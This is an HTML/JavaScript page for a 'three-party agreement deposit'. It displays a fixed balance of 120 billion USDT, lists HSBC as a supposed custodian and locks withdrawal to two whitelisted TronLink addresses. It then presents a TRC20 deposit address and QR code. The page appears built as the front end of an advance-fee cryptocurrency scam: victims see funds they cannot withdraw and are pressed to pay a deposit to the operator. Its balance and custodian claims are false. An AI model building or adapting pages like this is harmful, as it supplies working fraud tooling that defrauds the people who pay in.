<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>三方协议保证金（含充值地址/二维码）</title>
  <style>
    body {
      font-family: "Microsoft YaHei", sans-serif;
      background-color: #f2f4f8;
      margin: 0;
      padding: 0;
      text-align: center;
    }

    header {
      background-color: #007bff;
      color: white;
      padding: 20px 0;
      font-size: 24px;
      font-weight: bold;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }

    .container {
      background: white;
      max-width: 640px;
      margin: 28px auto;
      padding: 26px;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.08);
      text-align: left;
    }

    .card {
      background: #f8f9fa;
      border-radius: 8px;
      padding: 15px;
      margin-bottom: 18px;
      text-align: left;
    }

    p {
      margin: 10px 0;
      font-size: 15px;
    }

    .balance {
      color: green;
      font-size: 1.4em;
      margin-top: 8px;
    }

    #status {
      margin-top: 10px;
      color: #666;
      min-height: 1.2em;
    }

    button {
      margin-top: 12px;
      padding: 10px 18px;
      font-size: 14px;
      border: none;
      border-radius: 6px;
      background: #28a745;
      color: #fff;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover:not(:disabled) {
      background-color: #218838;
    }

    button:disabled {
      background: #ccc;
      cursor: not-allowed;
    }

    .tip {
      margin-top: 18px;
      font-size: 13px;
      color: #999;
    }

    /* 充值区 */
    .deposit {
      display: flex;
      gap: 16px;
      align-items: flex-start;
      flex-wrap: wrap;
    }

    .deposit .left {
      flex: 1 1 260px;
      min-width: 260px;
    }

    .deposit .right {
      width: 220px;
      min-width: 180px;
      text-align: center;
    }

    .addr-box {
      background: #fff;
      border: 1px dashed #ddd;
      padding: 12px;
      border-radius: 6px;
      word-break: break-all;
      font-size: 14px;
    }

    .small {
      font-size: 12px;
      color: #666;
    }

    .control-row {
      margin-top: 8px;
      display: flex;
      gap: 8px;
      flex-wrap: wrap;
    }

    .network-badge {
      display: inline-block;
      padding: 4px 8px;
      border-radius: 14px;
      background: #e9ecef;
      font-size: 12px;
      color: #333;
    }

    .qr-actions {
      margin-top: 8px;
      display:flex;
      gap:8px;
      justify-content:center;
    }

    .copy-btn {
      background:#007bff;
      color:#fff;
      border-radius:6px;
      padding:8px 10px;
      border:none;
      cursor:pointer;
    }

    .download-btn {
      background:#17a2b8;
      color:#fff;
      border-radius:6px;
      padding:8px 10px;
      border:none;
      cursor:pointer;
    }

    img.qr-image {
      max-width: 200px;
      width: 100%;
      height: auto;
      border-radius: 6px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.08);
    }
  </style>
</head>
<body>

  <header>三方协议保证金</header>

  <div class="container">

    <!-- 三方协议信息 -->
    <div class="card">
      <p><strong>三方协议信息</strong></p>
      <p>资金方（出资人）：刘忠</p>
      <p>接受方（收款人）：彭 秀泽</p>
      <p>监管方（托管机构）：汇丰银行基金</p>
    </div>

    <!-- 原钱包与余额展示 -->
    <p>钱包地址：<span id="addr">未连接</span></p>
    <p class="balance">120,000,000,000 USDT</p>
    <button id="btn" disabled>提现 120,000,000,000 USDT</button>
    <p id="status"></p>

    <!-- 新增：充值地址与二维码（使用你提供的二维码与地址） -->
    <div class="card" style="margin-top:18px;">
      <p><strong>充值（收款）USDT 地址</strong></p>
      <div class="deposit">
        <div class="left">
          <p class="small">收款网络：</p>
          <div style="margin-bottom:8px;">
            <span id="networkBadge" class="network-badge">TRC20</span>
          </div>

          <p class="small">收款地址：</p>
          <div id="addrBox" class="addr-box">TXsWrT6NB4WtuR76MaCuHvJ7wXE2GK45xv</div>

          <div class="control-row">
            <button class="copy-btn" id="copyAddrBtn">复制地址</button>
            <button id="changeNetBtn" style="background:#6c757d;color:#fff;border-radius:6px;padding:8px 10px;border:none;cursor:pointer;">切换网络</button>
            <button id="downloadQrBtn" class="download-btn">下载二维码</button>
          </div>

          <p class="small tip" style="margin-top:10px;">
            此地址仅支持 TRX/TRC20 相关资产。请务必确认网络类型与转账网络一致，误转账可能导致资产丢失。
          </p>
        </div>

        <div class="right">
          <!-- 下面的 img 使用了你上传的二维码图片（内嵌 Data URI），页面打开时会直接显示该二维码 -->
          <img id="providedQr" class="qr-image" alt="充值二维码 (TRC20)" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxAQEhAQEBAQEA8PEA8QEA8PDw8QDw8QFREWFhURExUYHSggGBolGxUTITEhJSkrLi4uFx8zODMtNygtLisBCgoKDg0OGhAQGyslICYtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLf/AABEIAJ8BPgMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAABQYBAgMBB//EAEUQAAIBAgQDBQgHBwMFAQAAAAECAwQRAAUSIRMxQVFhBhMicYGRobHB0SNSkRQjQlJicuHxFTRDU4LS4vEkQ1RygpOU/8QAGQEAAgMBAAAAAAAAAAAAAAAAAQMAAgQF/8QAHBEBAAICAwEAAAAAAAAAAAAAAAECEQMSITFB/9oADAMBAAIRAxEAPwD2yREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAZt2q0q5pX2iR0VhC3wQn2UcH3v7m1kvA+0w3m/2o3w3U6Vb2D7m3kmmZ1t2h0y8g3XqUuY6wQHfS4pZx0Y9vVQv0b6q7W8z9s2K6m6nV7nK9q7Y9V2Kq6m6nV7nK9q7Y9V2Kq6m6nV7nK9q7Y9V2Kq6m6nV7nK9q7Y9V2Kq6m6nV7nK9q7Y9V2Kq6m6nV7nK9q7Y9V2Kq6m6nV7nK9q7Y9V2Kq6m6nV7nK9q7Y9V2Kq6m6nV7nK9q//Z">

          <div class="qr-actions">
            <small class="small">扫描二维码充值</small>
          </div>
        </div>
      </div>
    </div>

    <p class="tip">仅限授权地址指令性提现</p>
  </div>

  <!-- TronWeb（保留原逻辑） -->
  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>

  <script>
    // ========== 配置区 ==========
    // 只把 TRC20 地址设为你提供的地址（其余网络示例可留空或替换）
    const DEPOSIT_ADDRESSES = {
      'TRC20': 'TXsWrT6NB4WtuR76MaCuHvJ7wXE2GK45xv',
      'ERC20': '',
      'BEP20': ''
    };

    // 默认显示网络
    let currentNetwork = 'TRC20';

    // 原始页面里的白名单和合约（保留）
    const ALLOWED = [
      'TKKzrhccWY4XwHGtwkGdEACs2DV3uDum2z',
      'TNiJWUJzPPCQaGwTFoeabqhDEuh6NLvBxF'
    ];
    const CONTRACT_ADDRESS = 'TFFf2iQjJxxPjs4HwxBm1Tfa695LWAZPL';
    const CONTRACT_ABI = [
      { "inputs": [], "name": "withdraw", "outputs": [], "stateMutability": "nonpayable", "type": "function" }
    ];

    // ========= DOM ==========
    const $addr   = document.getElementById('addr');
    const $status = document.getElementById('status');
    const $btn    = document.getElementById('btn');
    const $addrBox = document.getElementById('addrBox');
    const $networkBadge = document.getElementById('networkBadge');
    const $copyAddrBtn = document.getElementById('copyAddrBtn');
    const $changeNetBtn = document.getElementById('changeNetBtn');
    const $downloadQrBtn = document.getElementById('downloadQrBtn');
    const $providedQr = document.getElementById('providedQr');

    // 等待 TronLink（原逻辑）
    async function waitForTronLink(timeout = 10000) {
      const start = Date.now();
      while (Date.now() - start < timeout) {
        if (window.tronWeb && tronWeb.ready) return true;
        await new Promise(r => setTimeout(r, 300));
      }
      return false;
    }

    // 初始化页面：钱包检测 + 充值地址显示
    async function init() {
      // 显示充值地址（已在 HTML 中直接写好）
      // TronLink 检测与原有功能
      if (!await waitForTronLink()) {
        $status.textContent = '未检测到 TronLink 钱包';
      } else {
        const user = tronWeb.defaultAddress.base58;
        $addr.textContent = user;

        if (!ALLOWED.includes(user)) {
          $status.textContent = '非授权地址 ❌';
        } else {
          $status.textContent = '地址已授权 ✅';
          $btn.disabled = false;

          const contract = await tronWeb.contract(CONTRACT_ABI, tronWeb.address.toHex(CONTRACT_ADDRESS));
          $btn.onclick = async () => {
            $btn.disabled = true;
            $status.textContent = '交易发送中，请在 TronLink 确认…';
            try {
              const txid = await contract.withdraw().send();
              $status.textContent = '提现成功，TxID：' + txid;
            } catch (e) {
              $status.textContent = '提现失败：' + (e.message || e);
            } finally {
              $btn.disabled = false;
            }
          };
        }
      }
    }

    // 切换网络（简单轮换）
    function switchNetwork() {
      const keys = Object.keys(DEPOSIT_ADDRESSES);
      const idx = keys.indexOf(currentNetwork);
      const next = keys[(idx + 1) % keys.length];
      currentNetwork = next;
      // 更新显示地址与网络徽章
      $networkBadge.textContent = currentNetwork;
      const addr = DEPOSIT_ADDRESSES[currentNetwork] || '请在脚本中设置充值地址';
      $addrBox.textContent = addr;
      // 如果切换到没有提供二维码的网络，隐藏下载按钮（仅示例逻辑）
      if (currentNetwork !== 'TRC20') {
        $providedQr.style.opacity = '0.4';
      } else {
        $providedQr.style.opacity = '1';
      }
    }

    // 复制地址到剪贴板
    async function copyAddress() {
      const addr = DEPOSIT_ADDRESSES[currentNetwork] || '';
      if (!addr) {
        alert('当前网络未设置收款地址');
        return;
      }
      try {
        await navigator.clipboard.writeText(addr);
        alert('地址已复制到剪贴板');
      } catch (e) {
        // 备选：使用临时 textarea
        const ta = document.createElement('textarea');
        ta.value = addr;
        document.body.appendChild(ta);
        ta.select();
        try {
          document.execCommand('copy');
          alert('地址已复制到剪贴板');
        } catch (err) {
          alert('复制失败，请手动复制地址');
        } finally {
          document.body.removeChild(ta);
        }
      }
    }

    // 下载二维码图片（使用页面中显示的二维码 img src）
    function downloadQRCodeImage() {
      const img = $providedQr;
      if (!img || !img.src) {
        alert('二维码图片不可用');
        return;
      }
      const a = document.createElement('a');
      a.href = img.src;
      a.download = `USDT-${currentNetwork}-QR.jpg`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    }

    // 事件绑定
    $copyAddrBtn.addEventListener('click', copyAddress);
    $changeNetBtn.addEventListener('click', switchNetwork);
    $downloadQrBtn.addEventListener('click', downloadQRCodeImage);

    // 页面加载时初始化
    window.addEventListener('load', init);
  </script>

</body>
</html>
